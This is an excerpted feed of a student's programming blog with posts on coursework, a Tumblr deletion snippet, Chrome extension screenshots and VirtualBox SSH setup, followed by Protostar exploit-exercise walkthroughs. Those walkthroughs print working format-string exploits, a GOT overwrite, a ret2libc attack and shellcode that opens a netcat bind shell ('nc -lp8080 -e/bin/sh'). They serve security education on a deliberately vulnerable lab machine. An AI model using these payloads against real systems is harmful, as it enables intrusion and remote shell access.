    <title type="html"><![CDATA[Sophomore Spring: A Brief List of What I Learned]]></title>
    <link href="http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester/"/>
    <updated>2013-05-13T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester</id>
    <content type="html"><![CDATA[<p>Here’s a concise list of [some of] the things that I learned this semester. I would say that the things that I learned this semester are a lot more diverse than those from last semester (I’d describe last semester as…math).</p>

<h2 id="research">Research</h2>

<p>(I work in an HCI research group).</p>

<p><strong>Demo or die</strong>.</p>

<p><strong>Experimental design in HCI</strong> is very similar to experimental design in psychology. HCI is human-computer interaction; psychology is human interaction.</p>

<!-- more -->

<p><strong>What does my advisor do in his day-to-day life?</strong> As an HCI professor, he is a master of experimental design. As an advisor, his day is often filled with meetings, colloquia, and proposals. I wonder when he finds time to hack on something or put together a project (but amazingly, he manages to do it).</p>

<p><strong>What is the life of a grad student like?</strong> They seem to have a lot of time to code things. They attend a lot of talks, possibly looking for inspiration?</p>

<p>Group meeting is very insightful.</p>

<p>I’ve known, but now better understand, the concept of <strong>programming as a tool.</strong> The person reading your paper doesn’t care about your code, your backend, or your choice of framework.</p>

<h2 id="programming-languages">Programming Languages</h2>

<p>The class could be titled <em>Programming Languages Theory</em>, since it’s an introductory class. I think students who haven’t taken it and aren’t familiar with the field aren’t too sure what topics to expect.</p>

<p>What is programming language (PL) theory? Here’s a meme-style joke that I usually think of when someone asks me what it is:</p>

<dl>
  <dt>What students outside of computer science think:</dt>
  <dd>“Oh, so you learn how to program in a lot of different programming languages.”</dd>
  <dt>What computer science students unfamiliar with PL think (myself included at the time):</dt>
  <dd>“You do something formal with programming languages. You prove things about them. Or something like that.”</dd>
  <dt>What it really is:</dt>
  <dd>“Logic and inference rules. Induction. Semantics and types. More inference rules. Models.”</dd>
</dl>

<p>There is a lot more to the field, but that’s what was packed into the introductory course.</p>

<p>There also seem to be a lot of ways to teach a PL course. From looking at other resources on the internet, a lot of professors choose to make the whole course closely follow some programming language, and all concepts are taught with applications. I think I prefer the approach in my course, where the first half was purely theory and the second half mixed theory with code.</p>

<h2 id="computational-linguistics">Computational Linguistics</h2>

<p>Lambda-calculus has applications in grammars and quantifiers!</p>

<p>I actually gained a good understanding of the problems in natural language processing. It was a good class for breadth, and my final project, which tackled <a href="http://en.wikipedia.org/wiki/Word-sense_disambiguation">word sense disambiguation</a>, was pretty interesting.</p>

<p>Prolog is interesting. I’m pretty impressed by how easy it is to build a basic parser in Prolog.</p>

<h2 id="rover">Rover</h2>

<p><strong>Clients don’t care about the technical details.</strong> Don’t make excuses, get things done, and translate them to the appropriate nontechnical language.</p>

<p><strong>Keep communicating with the client.</strong> Just as you would <a href="http://online.wsj.com/article/SB122511931313072047.html">manage up</a> with your boss, go out of your way to maintain a good relationship with clients.</p>

<h2 id="development">Development</h2>

<p>Javascript frameworks seem to be the new thing. Client-side frameworks for single page web applications make a lot of sense though, reducing the unnecessary overhead of maintaining the server. I’d definitely like to try <a href="http://meteor.com">Meteor</a>. No jQuery spaghetti.</p>

<p>That being said, a <em>lot</em> more experience with web development this semester through my research project. If I could go back, I would have used a Javascript framework (but that’s what the first major project in a language is for!).</p>

    <id>http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts</id>
    <content type="html"><![CDATA[<p>One of my friends asked me how to batch delete all of the posts on a <a href="http://tumblr.com">Tumblr</a>. There are some PHP and Ruby scripts on the internet that claim to achieve this, but they seem to be outdated in regards to the Tumblr API, or they require installing some packages.</p>

<!-- more -->

<h2 id="instructions">Instructions</h2>

<p>This will allow you to delete 100 posts at a time. Unfortunately, if you try more, Tumblr will give you a warning that only 100 posts can be edited at one time.</p>

<ol>
  <li>On the right side of the Tumblr dashboard, click <strong>Posts</strong> underneath the name of your blog.</li>
  <li>This should bring up a link called <strong>Mass Post Editor</strong>. Click on <strong>Mass Post Editor</strong>.</li>
  <li>You’ll be presented with your posts as tiles. <strong>Keep scrolling down</strong> until at least 100 posts (eyeball it) appear on the screen.</li>
  <li>
    <p>Paste the following code snippet in the URL bar. It should select the first 100 posts with checkmarks. <strong>NOTE:</strong> Some browsers will remove the <code>javascript:</code> in front of it. Double check that it’s still there, and if not, type <code>javascript:</code> at the beginning of the pasted part. </p>

    <pre><code>  javascript:$('.overlay').slice(0, 100).click()
</code></pre>
  </li>
  <li>Click <strong>Delete selected posts</strong>.</li>
  <li>Refresh the page if needed, and delete another 100 posts!</li>
</ol>

<p>If for some reason this doesn’t work, let me know in the comments. I’ll try to keep this up-to-date.</p>

<p>Last updated: December 29, 2013</p>

<h2 id="technical-details">Technical Details</h2>

<p>Tumblr now uses <a href="http://jquery.org">jQuery</a>. An older version of this post loaded the <a href="https://github.com/kangax/protolicious">Protolicious</a> library, but some time between May 2013 and December 2013, Tumblr switched JavaScript libraries.</p>

    <link href="http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle/"/>
    <updated>2013-01-31T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle</id>
    <content type="html"><![CDATA[<p>Below is a short Python script that finds a fractional approximation of \(\pi\) using the first 1001 multiples of \(\pi\) (the case with 11 multiples of \(\pi\) can easily be done by hand). It makes use of the <em>pigeonhole principle</em>. The 11-multiple version of the problem has been used in the module teaching the pigeonhole principle in various classes that I have taken or taught.</p>

<p>The <a href="http://en.wikipedia.org/wiki/Pigeonhole_principle">pigeonhole principle</a> states that:</p>

<blockquote>
  <p>If \(n &gt; m\) and \(n\) pigeons are placed in \(m \) pigeonholes, then one pigeonhole must contain more than one pigeon.</p>
</blockquote>

<!-- more -->

<h2 id="problem-and-solution">Problem and Solution</h2>

<blockquote>
  <p>Given the following multiples of \(\pi\), each truncated to four decimal places:</p>

  <p>\(0\pi = 0.0000, 1\pi = 3.1415, 2\pi = 6.2831, … 1001\pi = 3144.7342 \)</p>

  <p>Use the pigeonhole principle to find a good rational approximation to \(\pi\).</p>
</blockquote>

<p>If we are given the multiples \(0 \pi \) through \( 1000 \pi \), we have 1001 multiples of \(0 \pi \). Consider the first three digits to the right of the decimal place of a number (in 123.456, the digits 456).</p>

<p>There are only 1000 possibilities for the first three digits to the right of the decimal place. Given 1001 multiples of \(\pi \), we can conclude from the pigeonhole principle that two such multiples must have the same three digits. This means that the difference to the right of the decimal point them is less than 0.001 in absolute value (for example, \(0.1235 - 0.1230 = 0.005\)).</p>

<p>Let \(m \pi, n \pi, m &gt; n \) be two multiples sharing the three numbers to the right of the decimal place. Then:</p>

<script type="math/tex; mode=display"> m\pi - n\pi = (m - n) \pi \implies \pi = \frac{m \pi - n \pi}{m - n} </script>

<p>Because \( m\pi - n\pi \) has a difference to the right of the decimal place that is less than 0.001, it approximates some integer. Therefore, we can use \( \frac{m \pi - n \pi}{m - n} \) as a rational approximation of \pi.</p>

<h2 id="code">Code</h2>

<p>For 11 multiples of \( \pi \), the problem is trivial to do by hand. For 1001 multiples, I’ve written a Python script to solve the problem. You can play around with the code <a href="http://codepad.org/HCmovMEd">here</a>.</p>

    <link href="http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot/"/>
    <updated>2013-01-16T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot</id>
    <content type="html"><![CDATA[<p>This post describes how to create a completely accurate image preview of a DOM element on the page by using Javascript in a Chrome extension. I stumbled upon this issue while working on a web implementation of <a href="http://www.mendeley.com/research/enhanced-area-cursors-reducing-fine-pointing-demands-people-motor-impairments/">click-and-cross (Findlater et al.)</a> for research. This process consists of two subproblems.</p>

<ol>
  <li>How can we take a screenshot of the current page using Javascript?</li>
  <li>Given the screenshot of part of the page, how can we crop out our element from the screenshot?</li>
</ol>

<!-- more -->

<p>If you’re only interested in the code and not the explanation of the problem, <a href="#code">click here</a>.</p>

<h2 id="overview">Overview</h2>

<h3 id="the-screenshot-problem-imperfect-solutions">The screenshot problem: imperfect solutions</h3>

<p>Given only plain Javascript and a DOM, outside of the context of a Chrome extension it’s not possible to take a completely accurate screenshot of the page. This is explained in a <a href="http://stackoverflow.com/questions/4912092/using-html5-canvas-javascript-to-take-screenshots/">Stack Overflow question</a>.</p>

<p>The top answer offers a solution that uses a script called <a href="http://html2canvas.hertzen.com/">html2canvas</a>. Another potential solution is <a href="http://www.aplweb.co.uk/blog/js/magnifying-glass/">Magnifying Glass</a>, which works by duplicating the HTML content of the body and re-rendering it in a “magnifying glass” (<a href="http://www.aplweb.co.uk/blog/js/magnifying-glass/demo.html">demo</a>). However, Magnifying Glass will conflict with any HTML-embedded Javascript, and html2canvas produces an imperfect replication of the page.</p>

<p>The solution in this post is dependent on the fact that the Chrome extension API provides a function, <code>chrome.tabs.captureVisibleTab()</code> <a href="http://developer.chrome.com/extensions/tabs.html#method-captureVisibleTab">(docs)</a>, for taking a screenshot of the visible part of a tab.</p>

<h3 id="picking-out-the-element-from-the-screenshot">Picking out the element from the screenshot</h3>

<p>Since the <code>captureVisibleTab()</code> function only gives us a portion of the screen, we can’t simply use the offset (top, left) of the rendered element.</p>

<p>For example, in the figure below, let the shaded part of the screen be the part of the screen that we capture, and the <strong>Message Passing</strong> header, boxed in yellow, be the element that we want to capture. Given the position of the screenshot relative to the origin of the window (the black dots), we’ll compute the position of our element relative to the origin of the screenshot (the blue dots), then crop out that region.</p>

<ul class="thumbnails" style="text-align: center;">
    <li class="span6" style="display:inline-block; float: none;">
    <a href="http://louisrli.github.io/images/chrome-screenshot-demo.png" class="thumbnail">
        <img src="http://louisrli.github.io/images/chrome-screenshot-demo.png" alt="Diagram of the element that we want to capture relative to the screenshot" />
    </a>
    </li>
</ul>

<h2 id="code">Code</h2>

<p>Chrome extensions have two distinct parts involving Javascript: the extension (runs in the background) and the content scripts (runs on a certain page and can access the DOM). Content scripts <em>cannot</em> access most of the Chrome extension API (such as <code>captureVisibleTab()</code>), but extensions and content scripts can communicate indirectly through <a href="http://developer.chrome.com/extensions/messaging.html">message passing</a>.</p>

<p>Make sure that these permissions are included in your <code>manifest.json</code>, and add the functions to one of your content scripts.</p>

<p>We do three things:</p>

<ol>
  <li>Use the extension to capture a screenshot of the open tab, receiving a <code>data://</code> URL to the image and sending it to the content script.</li>
  <li>In the content script, scale down the screenshot by drawing it to a canvas. The original image may be higher resolution than the actual window, so it needs to be scaled.</li>
  <li>Crop out the portion of the screenshot canvas that we need onto another canvas, now containing our element.</li>
</ol>

<p>We add a listener in the background script of the extension. When a screenshot is requested, it will take a screenshot and send back the <code>data://</code> URL.</p>

<p>Our content script will take two functions. One takes a screenshot of the page, and it accepts a callback argument after the screenshot has finished. When the screenshot is taken, we encode the current position of the window using jQuery’s <code>scrollLeft()</code> and <code>scrollTop()</code>.</p>

<p>Our second function takes a jQuery element and returns a jQuery object referring to a canvas with the preview of that element. It computes the position of the element on the canvas. We use the version of <code>drawImage()</code> <a href="https://developer.mozilla.org/en-US/docs/HTML/Canvas/Tutorial/Using_images#Slicing">(docs)</a> with the most parameters.</p>

<p>If this helped, feel free to leave and comment and let me know.</p>

<p>It’s up to you what you want to use the screenshots of the elements for, but here’s an example of what the screenshots would look like in click-and-cross:</p>

    <content type="html"><![CDATA[<p>I’ve been using <a href="http://qsapp.com/">Quicksilver</a> for a while, and I’d heard of how powerful but never taken advantage of it. I wanted to adjust the system volume through Quicksilver: right now, I have to use <code>fn</code> + <code>f10</code> / <code>f11</code> / <code>f12</code> to adjust volume, since I chose to have <code>f1</code>-<code>f12</code> map to the normal keys.</p>

<p>It seems that there’s actually no Quicksilver plugin for system volume – only iTunes volume – but it’s pretty simple to do with AppleScripts. It’s not documented everywhere, so I thought I’d add it here.</p>

<p>The AppleScripts below will adjust the system volume, which is measured on a scale of 0 - 100. Here’s a <a href="https://www.dropbox.com/s/8a3rzqtiyupmny1/volume-applescripts.zip">download link</a> for these three scripts. To use them in Quicksilver, add them to the catalog, and opening them in Quicksilver should run them by default.</p>

The problems become significantly harder, and I continued with Scala (June 2012 - August 2012).</dd>

  <dd>This was a pretty significant endeavor over the summer. The idea was motivated by my work with Amazon EC2 machines, virtual machines, and random in-house servers. Many times, I had to do work while ssh’d to those machines, but it was less productive without my comfortable shell and emacs environment at hand. sftp’ing files is a bit tedious, so I wrote a client (command-line Python) and a server (RESTful API) for accessing my dotfiles. The server is currently hosted on Heroku. I do, in fact, eat my own dog food, and it’s very handy when setting up new computers.</dd>

<p>The target audience was supposed to be other students in the course, and the paper should help students decide whether they would pursue the given area of mathematics.</p>

<p>I found this project surprisingly pleasant. Here’s <a href="https://www.dropbox.com/s/o1dalrrvstz0u7g/math101-final-paper.pdf">a link to the paper</a>.</p>

<p>I’m going to be a course assistant for a one-week winter break course on discrete math. I’m very excited to return this year to teach, having been a student of the course last year.It’s a fast-paced, active learning course that covers 10 modules (topics), two per day. I’ll be preparing and presenting the logic module. I’ve recently been converted into a believer for active learning.</p>

&gt; On Linux hosts … for other protocols such as IPv6 and IPX, you must choose a wired interface.</p>

<p>I moved into the dorms yesterday, where I was hit by an IPv6 address and found that I couldn’t SSH to one of my VMs. After playing around and finding the solution, I thought I’d write a guide since I hadn’t found one immediately on the internet.</p>

<h2 id="install-openssh-guest">0. Install OpenSSH (Guest)</h2>
<p>Make sure the SSH server is installed:</p>

<p>Navigate to <strong>File -&gt; Preferences -&gt; Network</strong>, and click the icon with a plus sign. By default, it will create a host network named <code>vboxnet0</code>.</p>

<h2 id="add-a-network-adapter-host">2. Add a network adapter (Host)</h2>
<p>On the host, first shut off the guest VM. Next, right-click the VM in the library and open the settings. We’ll create a second adapter (“Adapter 2”) attached to a <strong>Host-only Adapter</strong>, as shown in the picture below.</p>

    <updated>2012-08-29T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>

<h1 id="solutions">Solutions</h1>
<p>## Format: Level 0
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>

<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format0 %64s<span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xef\xbe\xad\xde&quot;&#39;</span><span class="k">)</span>

<span class="go">you have hit the target correctly :)</span></code></pre></div>

<!-- more -->
<p>## Format: Level 1
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>

<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format1 <span class="p">|</span> grep target
<span class="go">08049638 g       0 .bss    00000004            target</span></code></pre></div>

<p>Next, we need to find where the format function expects the first (missing) argument to the format string.</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">Starting program: /opt/protostar/bin/format1 AAAA%08x

Breakpoint 1, __printf (format=0xbffff98f &quot;AAAA%08x&quot;) at printf.c:29

0xbffff784:     0x0804960c
(gdb) p 0xbffff98f - 0x0bffff784
$1 = 523</code></pre></div>

<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string’s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>

<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run AAAAA%08x
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/format1 AAAAA%08x

Breakpoint 1, __printf (format=0xbffff98e &quot;AAAAA%08x&quot;) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/xw 0xbffff784

<ul>
  <li><code>0xbffff784</code>: The first argument to the format string.</li>
  <li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
</ul>

<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for “stack popping” additional arguments) is about 500 bytes.</p>

<p>With a few calculations, we can find the correct offset.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format1 <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x38\x96\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;..%128$n&#39;</span>
<span class="go">8..you have modified the target :)</span></code></pre></div>

<h2 id="format-level-2">Format: Level 2</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format2 <span class="p">|</span> grep target
<span class="go">080496e4 g     O .bss   00000004              target</span></code></pre></div>

<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xe4\x96\x04\x08&quot;&#39;</span><span class="k">)</span>%4<span class="se">\$</span>08x <span class="p">|</span> ./format2
<span class="go">080496e4target is 0 :(</span></code></pre></div>

<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xe4\x96\x04\x08&quot;&#39;</span><span class="k">)</span>%60u%4<span class="se">\$</span>n <span class="p">|</span> ./format2

<h2 id="format-level-3">Format: Level 3</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>

<span class="go">080496f4 g     O .bss   00000004              target</span></code></pre></div>

<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break printf

<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo </span>AAAA%12<span class="se">\$</span>x <span class="p">|</span> ./format3
<span class="go">AAAA41414141</span>
<span class="go">target is 00000000 :(</span></code></pre></div>

<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;ibase=16; 44&quot;</span> <span class="p">|</span> bc

<span class="go">1</span></code></pre></div>

<p>Finally, we write values to each of the four bytes of <code>target</code>:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xf4\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf5\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf6\x96\x04\x08&quot;&#39;</span><span class="k">)$(</span>perl -e <span class="s1">&#39;print &quot;\xf7\x96\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%52u%12$n%&#39;&#39;17u%13$n&#39;&#39;%173u%14$n&#39;</span> <span class="p">|</span> ./format3

<span class="go">you have modified the target :))</span></code></pre></div>

<p>Note that it wasn’t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>

<h2 id="format-level-4">Format: Level 4</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>

<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="s1">&#39;AAAA%4$x&#39;</span> <span class="p">|</span> ./format4
<span class="go">AAAA41414141</span></code></pre></div>

<p>In order to perform this exploit, we’ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we’ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -TR format4 <span class="p">|</span> grep <span class="nb">exit</span>
<span class="go">00000000      DF *UND* 00000000  GLIBC_2.0   _exit</span>
<span class="go">00000000      DF *UND*  00000000  GLIBC_2.0   exit</span>

<span class="go">080484b4 g     F .text  0000001e              hello</span></code></pre></div>

<p>To confirm that our overwrite works correctly, we run a quick test:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x24\x97\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%4$n&#39;</span> &gt; /tmp/format4
<span class="gp">$</span> gdb -q format4
<span class="go">Reading symbols from /opt/protostar/bin/format4...done.</span>
<span class="go">(gdb) run &lt; /tmp/format4</span>
<span class="go">Starting program: /opt/protostar/bin/format4 &lt; /tmp/format4</span>
<span class="gp">$</span>�
<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="go">0x00000004 in ?? ()</span></code></pre></div>

<p>Execution jumped to the address <code>0x00000004</code>, meaning that we’re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> – only the last two bytes need to be changed.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\x24\x97\x04\x08&quot;&#39;</span><span class="k">)</span><span class="s1">&#39;%33968u%4$hn&#39;</span> <span class="p">|</span> ./format4

<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>

<p>We’ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>

<p>### Solution
First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>

<p>For our solution, we’ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it’s one of the most well-written papers that I’ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>

<p>First, we find the addresses of the <code>system()</code> and <code>exit()</code> libc functions. <code>exit()</code> isn’t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gdb -q stack6
<span class="go">Reading symbols from /opt/protostar/bin/stack6...done.</span>
<span class="go">(gdb) break main</span>

<span class="go">(gdb) run</span>
<span class="go">Starting program: /opt/protostar/bin/stack6</span>

<span class="go">Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27</span>
<span class="go">27      stack6/stack6.c: No such file or directory.</span>

<p>We see that our functions have the following addresses:</p>

<ul>
  <li><code>system()</code>: <code>0xb7ecefb0</code></li>
  <li><code>exit()</code>: <code>0xb7ec50c0</code></li>
</ul>

<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ~/try-address.sh <span class="m">80</span> <span class="o">(</span>ENV_VAR_ADDRESS<span class="o">)</span> <span class="o">(</span>EXIT<span class="o">()</span>_ADDRESS<span class="o">)</span> <span class="o">(</span>SYSTEM<span class="o">()</span>_ADDRESS<span class="o">)</span></code></pre></div>

<h4 id="sanity-checks">Sanity checks</h4>
<p>First, let’s make sure that we can actually execute code.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">TEST</span><span class="o">=</span>whoami

<h4 id="working-netcat-solution">Working netcat solution</h4>
<p>There are two obstacles to a working solution.</p>

<ol>
  <li>Environmental variables with spaces don’t work. All of the following would fail:</li>
</ol>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span><span class="s2">&quot;nc -lp8080 -e/bin/sh&quot;</span>

<ol>
  <li><code>system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
</ol>

<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>

<p><code>system()</code> doesn’t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code>RUN</code> is the next variable. We then adjust our estimate for the address of <code>RUN</code> by 20 bytes.</p>

<p>Finally, through a remote machine:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080

<h2 id="stack-level-7">Stack: Level 7</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack7">full</a>): Execute shellcode with further restrictions on the return address. Any address of the form <code>0xbxxxxxxx</code> raises an error.</p>

<h3 id="overview-1">Overview</h3>

<p>The return value of a function is usually stored in the <code>eax</code> register. The key to this level is the call to <code>return strdup(buf)</code>: this means we can find the buffer (e.g. our shellcode) in the <code>eax</code> register when <code>getpath()</code> returns.</p>

<p>The code restricts us from returning to any code on the bottom of the stack (<code>0xbxxxxxxx</code>) and advises us to return to the <code>.text</code> section. In particular, we’ll want to return to a <code>call eax</code> instruction, which will then call our shellcode.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -M intel -d stack7 <span class="p">|</span> grep <span class="s2">&quot;call.*eax&quot;</span>
<span class="go">8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax*4+0x804965c]</span>
<span class="go">80484bf:       ff d0                   call   eax</span>
<span class="go">80485eb:       ff d0                   call   eax</span></code></pre></div>

<p>If we play with the numbers like in earlier levels, we’ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">Buffer start
      | ---------- Shellcode (n bytes) --------- |
      | -------- Padding (80 - n bytes) -------- |
      | -- Return address 0x80484bf (4 bytes) -- |
Buffer end (84 bytes total)</code></pre></div>

<h3 id="solution">Solution</h3>
<p>In earlier levels, we found that opening a shell with <code>gets()</code>. However, we can still use it to validate our strategy:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> wc -c

<span class="gp">$</span> gdb -q stack7
<span class="go">Reading symbols from /opt/protostar/bin/stack7...done.</span>
<span class="go">(gdb) run &lt; /tmp/stack7shell</span>

<span class="go">Executing new program: /bin/dash</span>

<span class="go">Program exited normally.</span></code></pre></div>

<p>If we give it a shot with our <code>nc</code> shellcode, we’ll find the following error: <code>bin/sh: forward host lookup failed: Unknown host</code>. This occurs as a complication from having options passed into the <code>execve</code> call.</p>

<p>We can add another wrapper to the <code>netcat.c</code> used in Level 6 by writing our own shellcode. This shellcode will simply execute <code>/tmp/nc</code>, an alias for a compiled <code>netcat.c</code>. This file, in turn, calls netcat and listens via port 8080.</p>

<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>

<h3 id="solution">Solution</h3>

<h4 id="overview-1">Overview</h4>
<p>From a high level, this is our approach:
1. Store the shellcode in an environmental variable.
2. Find the approximate address of the environmental variable on the stack.
3. Overwriting the return address in <code>stack5</code> with the address of the environmental variable, we execute the shellcode.</p>

<p>There are various ways to execute shellcode, but it’s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it’s larger than the buffer (64 bytes).</p>

<h4 id="executing-binsh">Executing <code>/bin/sh</code></h4>
<p>The shellcode is a modified version of the code from <em>Hacking: The Art of Exploitation</em>. It runs the command <code>/bin//sh -sli</code>.</p>

